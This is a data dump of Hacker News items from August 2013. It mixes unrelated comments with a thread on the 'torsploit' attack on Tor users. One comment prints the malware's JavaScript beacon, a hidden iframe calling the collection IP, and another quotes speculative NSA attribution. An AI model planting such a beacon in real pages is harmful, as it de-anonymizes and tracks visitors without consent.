ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
6161666,comment,6161420,6161420,51,0,detcader,,,"Full forum post quoted below (I didn&#x27;t write it, just found it on social media a little while ago):<p>&quot;Well, the story gets more interesting...<p>This morning, we read that information from the NSA&#x27;s illegal surveillance databases has been routinely finding its way into DEA drug cases [1], with an entire government &quot;training programme&quot; in existence to mask the source of the information from defendants... as well as prosecutors and judges.<p>And this weekend, we&#x27;ve been working through the news that a large breach of security associated with the Tor network - it&#x27;s been dubbed #torsploit [2] - has taken place. Exploit code is available (see earlier posts in this thread), and folks have been de-obfuscating and analysing the code.<p>There&#x27;s also an IP address hard-coded into it - that&#x27;s where the info gathered by the malware is being sent. That IP address is:<p>65.222.202.53<p>Now, the press reporting on the address so far has been saying it&#x27;s a &quot;Verizon business address in Virginia.&quot; Yes, that&#x27;s what whois shows, but that&#x27;s not exactly the full story, or the real story.<p>The folks at Baneki Privacy Labs have been chasing down that detail. They first asked [3], in a game-theoretic way, whether the entire situation isn&#x27;t a bit too, well... obvious. I mean, did the FBI think nobody would notice? Everyone&#x27;s been assuming it&#x27;s the FBI, doing something like the &quot;Darkmarket honeypot,&quot; [4] or some such. It&#x27;s worth noting that nobody has taken public credit for this #torsploit [5] malware yet, so attributing it to the FBI is a leap of assumptive logic.<p>Turns out, the story is much more interesting than that.<p>Baneki dug deeper than whois, and got some clues things were spookier than they seemed. First, there&#x27;s an open port (80) [6] sitting on the machine in question. So it&#x27;s not some recycled or attempted-at-obfuscated IP address. It&#x27;s still live and running. Then the fun starts... [7]<p>SAIC.png [a]<p>SAIC is, needless to say, deep in the core of the cyber-military complex... and certainly not the FBI.<p>Some further investigation by Baneki turns up the following information [8]:<p>NSA.png [b]<p>That IP address is part of IP space directly allocated to the NSA&#x27;s Autonomous Systems (AS). It&#x27;s not FBI; it&#x27;s NSA.<p>What is an NSA IP address doing as a command & control contact for javascript malware being deployed in the #torsploit [9] attack? That remains to be seen... but we already know that PRISM data has been &quot;jumping the wall&quot; and leaking into other law enforcement hands. Is this an example of further abuse of PRISM&#x27;s &quot;national security only&quot; dataset? That appears the most likely explanation, at this point in time.<p>Glenn Greenwald has been warning us this is happening - and here&#x27;s another hard, objective, irrefutable data point. The NSA&#x27;s Alexander - who only last week was at DefCon doing his best to charm the audience [10] - is once again caught lying bald-faced.<p>What happens now? We sit back to await developments...&quot;<p>[1] <a href=""http://mobile.reuters.com/article/idUSBRE97409R20130805?irpc=932"" rel=""nofollow"">http://mobile.reuters.com/article/idUSBRE97409R20130805?irpc...</a>
[2] <a href=""https://twitter.com/search?q=%23torsploit&src=typd"" rel=""nofollow"">https://twitter.com/search?q=%23torsploit&src=typd</a>
[3] <a href=""https://twitter.com/Baneki/status/364323285003014144"" rel=""nofollow"">https://twitter.com/Baneki/status/364323285003014144</a>
[4] <a href=""https://www.cryptocloud.org/viewtopic.php?f=17&t=87"" rel=""nofollow"">https://www.cryptocloud.org/viewtopic.php?f=17&t=87</a>
[5] <a href=""https://twitter.com/search?q=%23torsploit&src=typd"" rel=""nofollow"">https://twitter.com/search?q=%23torsploit&src=typd</a>
[6] <a href=""https://twitter.com/Baneki/status/364336090057949184"" rel=""nofollow"">https://twitter.com/Baneki/status/364336090057949184</a>
[7] <a href=""https://twitter.com/Baneki/status/364340406361665536"" rel=""nofollow"">https://twitter.com/Baneki/status/364340406361665536</a>
[8] <a href=""http://pop.robtex.com/nsa.gov.html#records"" rel=""nofollow"">http://pop.robtex.com/nsa.gov.html#records</a>
[9] <a href=""https://twitter.com/search?q=%23torsploit&src=typd"" rel=""nofollow"">https://twitter.com/search?q=%23torsploit&src=typd</a>
[10] <a href=""https://twitter.com/CryptoCloudVPN/status/362864059105820674"" rel=""nofollow"">https://twitter.com/CryptoCloudVPN/status/362864059105820674</a>
[a] <a href=""http://i.imgur.com/9d3fj2G.png"" rel=""nofollow"">http://i.imgur.com/9d3fj2G.png</a>
[b] <a href=""http://i.imgur.com/PGnNvx9.png"" rel=""nofollow"">http://i.imgur.com/PGnNvx9.png</a>",1375725379
6161665,story,,,1,0,Suraj-Sun,"Rep. Amash: Snowden is a whistle-blower, told us what we need to know",http://www.washingtonpost.com/blogs/post-politics/wp/2013/08/04/amash-insists-snowden-told-us-what-we-need-to-know/,,1375725377
6161664,comment,6159743,6161321,1,0,purplelobster,,,"Maybe not initially, but there are probably more (humane) opportunities to optimize a factory process than to do the same thing to animals.",1375725372
6161663,comment,6159743,6161551,2,0,chc,,,"Three-dimensional chess. (Not really disagreeing. Just couldn&#x27;t turn down the challenge.)",1375725361
6161662,comment,6161303,6161579,2,0,chewxy,,,"<a href=""http://www.ecma-international.org/ecma-262/5.1/#sec-4.3.19"" rel=""nofollow"">http://www.ecma-international.org/ecma-262/5.1/#sec-4.3.19</a><p>As for why? I have no clue. It&#x27;s specified in the specification. That&#x27;s all. There are ToInteger(), ToInt32(), ToUint16(), ToUInt32 functions defined as well, but I think that&#x27;s for the host to implement<p>EDIT: oops. there isn&#x27;t a ToInt64() function defined.",1375725355
6161661,comment,6161420,6161596,16,0,Scaevolus,,,"Your argument is &quot;that would be obvious, so it must not be true&quot;? Why are you letting a feeling outweigh actual evidence?<p>Why bother? Timing attacks on Tor are much harder (require sniffing & correlating large percentage of network) than direct de-anonymization (require injecting malware in some servers).",1375725348
6161660,comment,6159743,6160902,5,0,penguindev,,,"You have heard of the Inuit right?  Or the Massai people?  How many vegetables do you think they ate?<p>Are you actually having health problems due to eating meat?<p>Edit: Another good thing to watch is the canadian documentary &#x27;My Big Fat Diet&#x27; on youtube.  Talks about the canadian indians (first nations) people having a ton of diabetes due to being on carbs and not their traditional fish based diet.",1375725347
6161659,comment,6161303,6161499,1,0,echohack,,,"I think demonstrating a set of features like this between a large number of langauges: say 20 to 50 would be a grand demonstration.",1375725310
6161658,comment,6161552,6161552,6,0,patio11,,,"If you have any questions, feel free to ask.",1375725302
6161657,comment,6158244,6161416,2,0,kbenson,,,"<i>so Clarkson hates EVs, hates Ford...</i><p>It&#x27;s a love/hate relationship.  He bought a GT40 (and then had many problems with it, but loved it, from what I remember).  From what I can gather from the series, Ford is fairly popular in the UK (with the Mondeo?), so it&#x27;s an easy target.",1375725296
6161656,comment,6159909,6161191,2,0,bane,,,"All I&#x27;m saying is, Apple would have made a sale that day if they offered a slightly larger product in addition to their already popular one. They don&#x27;t offer it, and they lost a customer. I&#x27;d imagine this same decision happens thousands of times a day and it&#x27;s bizarre that they haven&#x27;t identified that market segment as one to compete in.<p>Apple took it&#x27;s sweet time to get into the small tablet market, and now is selling iPad minis like they&#x27;re going out of style. Why not get into the <i>slightly larger</i> smartphone market which has already proven itself to be at least as popular a segment as the niche the iPhone is in.",1375725293
6161655,comment,6160337,6160337,1,0,qwerta,,,"Nice article but I disagree. I am very technical person and I really miss cofounder who would take care of social/business side.<p>First heaving new born children gives me focus on work. Before I would procrastinate a lot. Now I have to turn my idea into business, or there will be serious trouble. Sure I can only give it 10 hours X 6 days a week, but that is enough.<p>Secondly I disagree on remote location. It takes extra money (fast internet, video conferencing gear) and effort.  But it also gives more freedom to choose best partner.",1375725292
6161654,comment,6161420,6161596,2,0,mzs,,,"Because this is tor, it&#x27;s likely harder to sniff. This wanted to collect IPs and MACs.",1375725278
6161653,comment,6160977,6161531,2,0,toomuchtodo,,,"Does this mean we have to start equipping undersea seismic sensors and surface buoys with geiger counters? :(",1375725275
6161652,story,,,2,1,busterc,"The New Most Expensive Domain Ever, Bought for $35M",https://www.youtube.com/watch?v=U6gbCDL02R0&t=15m19s,,1375725275
6161650,comment,6161292,6161587,1,0,phonon,,,"The link was on top
<a href=""http://pebbleroad.github.io/jquery-taxonomy-browser/dist/"" rel=""nofollow"">http://pebbleroad.github.io/jquery-taxonomy-browser/dist/</a>",1375725264
6161649,comment,6161420,6161627,5,0,sp332,,,"It&#x27;s not just technical difficulty. It&#x27;s that people are watching them, and they don&#x27;t want to get caught doing it.",1375725263
6161648,comment,6161116,6161504,3,0,briandear,,,"The Leica Monochrome is insane awesome. However, If I owned that camera, I would be almost excessively paranoid to lend that camera out.",1375725250
6161647,story,,,4,0,blueveek,"Former Mozilla CEO to head security-software maker AVG",http://news.cnet.com/8301-1009_3-57596239-83/former-mozilla-ceo-to-head-security-software-maker-avg/,,1375725242
6161646,comment,6159633,6160612,1,0,apalmer,,,"The DOJ&#x27;s definition isn&#x27;t &quot;subtly&quot; broken. It is completely a willful attempt to circumvent established law and precedent with a very convoluted trail of reasoning. Also not sure if this is really DOJ&#x27;s definition, or certain branches of law enforcement.",1375725237
6161645,comment,6160337,6160337,4,0,amberes,,,"I allready decided to be a single founder. It&#x27;s damn hard to find someone interested in starting a venture together, it&#x27;s even harder finding someone on the same wavelength. I could grow a beard (omg I have!) waiting for this to happen.<p>I burned out working my ass off nights and weekends because my previous partner was absolutely sure he&#x27;d be able to sell our product. Which unfortunately turned out different (but that venture still makes money... Too much to let it die... Too less for it not to be a pita)<p>&#x27;your startup chances increase with a partner&#x27;. Yes, but I&#x27;m not interested in a startup that makes me filthy rich, I&#x27;m just looking for something to replace they daytime job where I don&#x27;t have to be at an office 5 days a week and where the office can be wherever my laptop is.<p>I have built several succesful applications over the years (for others) where I used my UI/UX skills (and really just common sense and thinking before code/design). I can make the tech side of a project from A to Z (and in my current daytime role also doing sales and marketing as I&#x27;m the sole manager of a very small but very profitable company).<p>And next time I&#x27;m taking on a co-founder, I want proof that he has commercial skills because it seems anyone thinks they can do marketing and sales or that it will happen by itself or something.",1375725237
6161644,comment,6161478,6161478,2,0,incision,,,"The first thing that springs to mind for me is natural language search that really works. Along the same lines, reliable transcription.",1375725233
6161643,comment,6123535,6124723,2,0,declan,,,"I interviewed Harvey Silverglate while he was writing his Three Felonies book and came away with precisely the opposite opinion. Harvey is hardly a &quot;liar and manipulator.&quot; He was EFF&#x27;s first attorney and is one of the leading civil liberties attorneys of our time.<p>Here&#x27;s what Harvey wrote about prosecutorial misconduct in Aaron Swartz&#x27;s case, for instance:
<a href=""http://dankennedy.net/2013/01/24/the-swartz-suicide-and-the-sick-culture-of-the-justice-dept/"" rel=""nofollow"">http://dankennedy.net/2013/01/24/the-swartz-suicide-and-the-...</a><p>I&#x27;m not sure what <anigbrowl> has against Harvey, but it seems like a personal vendetta untethered to reality.",1375725227
6161642,comment,6161116,6161116,6,0,brittohalloran,,,"Looks nice, congrats. First time seeing it and my most obvious question isn&#x27;t answered on the homepage: what happens if someone smashes my gear I rented out?<p>You should prominently highlight a protection policy.",1375725226
6161641,comment,6159752,6160468,3,0,VLM,,,"&quot;not for code which has been written with blessed references.&quot;<p>Thanks for pointing that out, it is an unfair article because the whole premise of the parody was if the author was running a blue sky startup... so legacy code sucks is not much of an argument.<p>Some time ago I reflexively converted everything perl OO that I touched to &quot;modern&quot; Moose and it seems to have been worth it.  Detection of non-Moose OO should be a Perl::Critic complaint.  You can always add something to the exclude= line in a perlcritic.rc file.  We&#x27;ve already got Perl::Critic::Tics and ::Lax and a bunch others, so ::FanOfMoose to complain about non-Moose OO is within the realm of possibility.",1375725209
6161640,story,,,2,0,sciwiz,"Moto X Review: A different kind of smartphone",http://www.theverge.com/2013/8/5/4588922/moto-x-review,,1375725208
6161639,story,,,1,0,pharkmillups,"Five Free RICON West Ticket Up For Grabs ",http://ricon.io/blog/2013-08-05-want-a-free-ricon-west-ticket.html,,1375725203
6161638,comment,6123535,6124723,2,0,declan,,,"I interviewed Harvey Silverglate while he was writing his Three Felonies book and came away with precisely the opposite opinion. Harvey is hardly a &quot;liar and manipulator.&quot; He was EFF&#x27;s first attorney and is one of the leading civil liberties attorneys of our time.<p>Here&#x27;s what Harvey wrote about prosecutorial misconduct in Aaron Swartz&#x27;s case, for instance:
<a href=""http://dankennedy.net/2013/01/24/the-swartz-suicide-and-the-sick-culture-of-the-justice-dept/"" rel=""nofollow"">http://dankennedy.net/2013/01/24/the-swartz-suicide-and-the-...</a><p>I&#x27;m not sure what <anigbrowl> has against Harvey, but it seems like a personal vendetta untethered to reality.",1375725200
6161637,comment,6158244,6160440,1,0,umsm,,,"This is largely due to the manufacturers. &quot;Americans&quot; don&#x27;t decide that a 5-series is luxury, it&#x27;s the manufacturers. You can&#x27;t buy a BMW or Mercedes without all of the bells an whistles. You can&#x27;t even buy many of the cheaper cars (i.e. A-Class) from those manufacturers in the US.",1375725199
6161636,story,,,2,0,Lightning,"Chromium Blog: An Improved DevTools Editing Workflow",http://blog.chromium.org/2013/08/an-improved-devtools-editing-workflow.html,,1375725196
6161635,comment,6161116,6161116,2,0,ivanbrussik,,,"dude, now this is a great idea.  karma karma karma",1375725194
6161634,comment,6160977,6161435,7,0,akiselev,,,"> Water, aka H2O, doesn&#x27;t activate so it is not radioactive, it can however carry radioactive isotopes in solution.<p>What? Tritium is an unstable hydrogen isotope that is radioactive, no matter what molecule it is found in. Combine that with acid-base chemistry which revolves around the disassociation of hydrogen from water and that tritium can end up as a beta emitter anywhere in the body, including in actual strands of DNA [1]. What radioactive isotopes the water carries as a solute is irrelevant to the presence of tritium in the molecules.<p>[1] <a href=""http://www.ncbi.nlm.nih.gov/pubmed/11130944"" rel=""nofollow"">http://www.ncbi.nlm.nih.gov/pubmed/11130944</a>",1375725184
6161633,comment,6159743,6161307,5,0,chc,,,"Based on the stuff I&#x27;ve read, I&#x27;m pretty sure you are much further from the norm than he is. Only eating a meat-containing dish for dinner once or twice a week is pretty unusual.",1375725182
6161632,comment,6159633,6160826,4,0,fnordfnordfnord,,,">I have a hard time siding with John Smith.<p>In principle, I don&#x27;t care about John Smith[1] and I wouldn&#x27;t advocate solely for the lawbreaker&#x27;s sake. I&#x27;m advocating for innocent people whose rights are violated. Now, if this scheme were directed against a different class of criminal like theiving bankers or corrupt policemen; I&#x27;d feel better about the result, but not much. Along those lines, it is offensive to imagine that our supposed inalienable rights are discarded for something as pedestrian as drug offenses when it is clearly possible for some violent crimes to be stopped[2]. Note that I am not an advocate for that. But IMO it is an added insult that we&#x27;re here living a version of Orwell&#x27;s nightmare, having just begun to suffer its abuses, but because of the priorities of gov&#x27;t don&#x27;t receive the benefit of pervasive gov&#x27;t protection.<p>On the ZOMG! slippery-slope angle, imagine just how abusive and corrupt an individual or small group of gov&#x27;t agents can be when they are allowed to conceal so much of an investigation. One person, or a small group can completely frame an individual for a crime with relatively little opportunity for the accused to defend themselves.<p>[1] Personally, I am an advocate from drug legalization, but that&#x27;s a separate issue.<p>[2] James Bamford alludes to the notion that NSA folk have had to observe some pretty terrible things in the course of duty. I don&#x27;t envy them for it.",1375725169
6161630,comment,6161465,6161465,8,0,arjn,,,"It seems every day we hear about things in the US getting worse for the average citizen. Is it a case that it was always like this and we&#x27;re only just finding out or are these more recent happenings ?",1375725164
6161629,comment,6161465,6161465,2,0,noir_lord,,,"They can take your property based on nothing more than probably cause.<p>It&#x27;s a good job that American Law Enforcement has shown itself over and over again to not abuse the powers granted to it then.",1375725154
6161628,comment,6158946,6161302,2,0,anuaitt,,,"Klarifier:<p>1) Why make it again if there is a platform already existing ? why not bother them : please check this link <a href=""http://productforums.google.com/forum/#!topic/calendar/vdFSJiVlhMQ"" rel=""nofollow"">http://productforums.google.com/forum/#!topic/calendar/vdFSJ...</a><p>2) Yes, I know it is my fault<p>3) I would rather chose not to comment on this.<p>4) Why create my own API ? If someone as good as Google has already build it ? I know how to code and have built this app within 3 months.<p>and yes I am a young developer and I know what business is. I know about code re-usability and providing a great user experience.<p>Regarding building of my own API, I could have done that but I always wanted to make Gmail Tasks better, because I have been using it from past two-years.<p>Learn to praise the people instead of finding negative aspects.",1375725150
6161627,comment,6161420,6161560,1,0,arkades,,,"Why? I mean, insofar as they&#x27;ve already said &quot;encryption makes you suspect&quot;, I&#x27;d imagine they&#x27;d want to break TOR wide open. So if they haven&#x27;t, I presume it&#x27;s because of technical difficulty. What&#x27;s stopping them from doing so, if they haven&#x27;t?",1375725127
6161626,comment,6161420,6161420,7,0,throwaway912397,,,"The form thread relies on a domaintools.com query [1], which points to &quot;SCIENCE APPLICATIONS INT&quot; [2] as the owner of this 65.222.202.53 Class C subset (65.222.202.53 has found in the updatify() function listed below [3]). You might recognize SAIC from the NSA&#x27;s &#x27;XKEYSCORE Systems Engineer&#x27; job posting thread [4] a couple days ago.<p><pre><code>  function updatify() {
  var iframe = document.createElement(&#x27;iframe&#x27;);
  iframe.style.display = &quot;inline&quot;;
  iframe.frameBorder = &quot;0&quot;;
  iframe.scrolling = &quot;no&quot;;
  iframe.src = &quot;http://65.222.202.53/?requestID=eb5f2c80-fc81-11e2-b778-0800200c9a66&quot;;
  iframe.height = &quot;5&quot;;
  iframe.width = &quot;*&quot;;
  document.body.appendChild(iframe);
  }
</code></pre>
[1] <a href=""http://www.domaintools.com/research/ip-explorer/?ip=65.222.202.53"" rel=""nofollow"">http://www.domaintools.com/research/ip-explorer/?ip=65.222.2...</a><p>[2] <a href=""http://en.wikipedia.org/wiki/SAIC_%28U.S._company%29"" rel=""nofollow"">http://en.wikipedia.org/wiki/SAIC_%28U.S._company%29</a><p>[3] <a href=""https://www.cryptocloud.org/viewtopic.php?f=9&t=2894&p=3852#p3849"" rel=""nofollow"">https://www.cryptocloud.org/viewtopic.php?f=9&t=2894&p=3852#...</a><p>[4] <a href=""https://news.ycombinator.com/item?id=6138205"" rel=""nofollow"">https://news.ycombinator.com/item?id=6138205</a>",1375725126
6161625,comment,6161144,6161577,14,0,rimantas,,,"Get a copy of &quot;Mythical man month&quot;.
Btw, where did you get an idea, that Apple has limited resources? What I hear is that they have really small teams.",1375725126
6161624,comment,6158817,6158986,1,0,wicknicks,,,"If it makes you feel any better, their publication[1] reports low accuracy on a popular dataset called LFW (which stands for Labelled Faces in the Wild). Most face recognition technology works very well on mugshots. Frontal Faces -- with almost consistent lighting and alignment. These technologies do not perform well on personal photos.<p>[1] <a href=""http://openbiometrics.org/publications/klontz2013open.pdf"" rel=""nofollow"">http://openbiometrics.org/publications/klontz2013open.pdf</a>",1375725118
6161623,comment,6160509,6160509,1,0,KeyBoardG,,,"Thank you so much for writing this. My company is planning a move from Fat-client + in house server model to web based likely a SPA solution.<p>I&#x27;ve spent the entire weekend pouring over JS frameworks and have had a rough time trying to compare Angular vs Ember vs Knockout. From a newby, they all seem to be very similar without having written large systems with each to compare.",1375725107
6161622,comment,6159952,6161233,1,0,systemtrigger,,,"I am saying it seems much easier to write about compelling user experiences than to create them, and given the price they are charging for their product it makes me wonder if I should be writing papers about user experiences instead of programming them.",1375725099
6161621,comment,6159743,6161556,5,0,axblount,,,"The second sentence of the article is &quot;His vegan parents, who fed him mainly soy milk and apple juice, were convicted in Atlanta recently of murder, involuntary manslaughter and cruelty.&quot;",1375725098
6161619,comment,6161103,6161103,2,0,arcameron,,,"We run a project that also takes use of video conferencing with WebRTC:<p><a href=""https://chat.echoplex.us/"" rel=""nofollow"">https://chat.echoplex.us/</a>
(make a new room by appending a different string to the URL)<p>and<p><a href=""https://github.com/qq99/echoplexus"" rel=""nofollow"">https://github.com/qq99/echoplexus</a>",1375725093
6161618,comment,6156035,6158189,1,0,dreamfactory,,,"> That&#x27;s a false dichotomy.<p>No it&#x27;s not, it already happened in New York in the 90&#x27;s.",1375725072
6161617,comment,6160337,6160337,1,0,api,,,"Isn&#x27;t there a massive stigma against solo founders? I get that impression from most of what I read.",1375725072
6161616,comment,6161478,6161478,2,0,rada,,,"Speech recognition: send an audio file, receive text.",1375725072
6161615,comment,6161363,6161363,2,0,outericky,,,"I hear their home page was built using their own product. So that says something right there. Looking forward to trying it.",1375725060
6161614,comment,6160977,6161369,4,0,yk,,,"But Tritium can be quite ugly if it gets into the body, since it can replace hydrogen. (And can therefore accumulate in the body.) This depends on the molecules tritium is attached to.<p>And on a further note, I believe that websites which need JS to scroll text are malicious.",1375725058
6161613,comment,6160977,6161369,1,0,mzs,,,"Back in &#x27;07 the Canadian Nuclear Safety Commission couldn&#x27;t get a limit from Japan:<p><a href=""http://nuclearsafety.gc.ca/eng/readingroom/healthstudies/tritium/"" rel=""nofollow"">http://nuclearsafety.gc.ca/eng/readingroom/healthstudies/tri...</a>",1375725053
6161612,comment,6159743,6161321,3,0,crpatino,,,"Beef is not very energy efficient anyways, around 10% conversion rate from pasture calories to animal tissue. Pork and chicken are much more efficient though.<p>From the very narrow perspective of energy efficient, the problem I see is that we are ditching a true and tested method of doing things with (up to a point) renewable resources and trying to create a substitute most likely based on petrochemicals, just at the same time as we&#x27;re dragging our feet on finding <i>and deploying</i> a viable alternative to petrol based energy systems.",1375725035
6161611,story,,,13,1,alan_cx,"Children given lifelong ban on talking about fracking",http://www.theguardian.com/environment/2013/aug/05/children-ban-talking-about-fracking,,1375725030
6161610,comment,6160977,6161369,2,0,nknighthb,,,"I&#x27;m not sure that Reuters didn&#x27;t misunderstand something. The tritium mention seems oddly out of place. A lot more than tritium has leaked from this plant, and I would be surprised if the water they&#x27;re leaking now is contaminated solely with tritium.<p>Also, I think with regard to tritium spilling into the sea, they&#x27;re probably less concerned about a direct effect on people than on the fish swimming around in it.",1375725025
6161609,comment,6139927,6139927,1,0,cmhylton,,,"Interface Vision - Santa Cruz, CA - Cooper Street<p>You are bored at work. You are distraught. Your tests arent passing because green is the new red. You want to be a part of something that will change the future. You wish you were challenged more. So, you check us out at <a href=""http://www.interfacevision.com"" rel=""nofollow"">http://www.interfacevision.com</a>.<p>Wow, you think. A visual language of some kind? Its been attempted before by many brilliant people. You ponder if they have some magical solution or have been partaking in some illicit chemical exploration.<p>Then you realize that, if a holy grail did exist, the way we make software would change forever. You see the Vision.
So, you contact us.<p>About the Position:
* You are given the freedom to create.
* You must be open minded, have the ability to speak your mind and also be willing to listen.
* Optimally, we would like you to be with us in Santa Cruz, CA. However, if we can pull it off, you can work from anywhere (Were going to be implementing remote collaboration, so we might as well eat our own dog food).
* The magic is done in C# Mono with Xamarin.iOS and Xamarion.Android (www.xamarin.com). Xamarin is an awesome company. Go check them out if you havent already.
* We dont have a specific software development position to fill so tell us what you would bring to the table and what you want to do - we will listen to everyone.
* We really need help extending our GUI for both iOS and Android.
* We are interested in extending our framework to include OpenCL, OpenGL, REST (and general API support), extensive math library, etc.<p>Your Abilities:
* What is your specialty?
* What do you like to work on?
* What have you done?
* Why do we want you?<p>We cant wait to hear from you - simply check out our career section on-line at <a href=""http://www.interfacevision.com"" rel=""nofollow"">http://www.interfacevision.com</a> and send us your info and resume/CV (depending on where you are from).",1375725014
6161608,comment,6161420,6161567,2,0,sp332,,,"The new title is a better description of what the article is about. If you just want to submit the AS ownership, you could link to <a href=""http://pop.robtex.com/nsa.gov.html#records"" rel=""nofollow"">http://pop.robtex.com/nsa.gov.html#records</a>",1375725006
6161607,comment,6161420,6161567,6,0,DannyBee,,,"I believe they prefer to have the original link&#x27;s page title used unless there is a very good reason not to.",1375724995
6161606,comment,6157157,6159523,0,0,smosher,,,"I was literally asking someone what <i>they</i> were talking about. Instead I got an answer from someone else about some<i>thing</i> else. It&#x27;s just some asshole who has one little nugget of information they want to spout at someone.",1375724976
6161605,comment,6159140,6159140,1,0,Chirael,,,"I really think Firefox should become the freedom lover&#x27;s privacy browser; because it is a non-profit org, it can do what Google/Chrome can&#x27;t.",1375724963
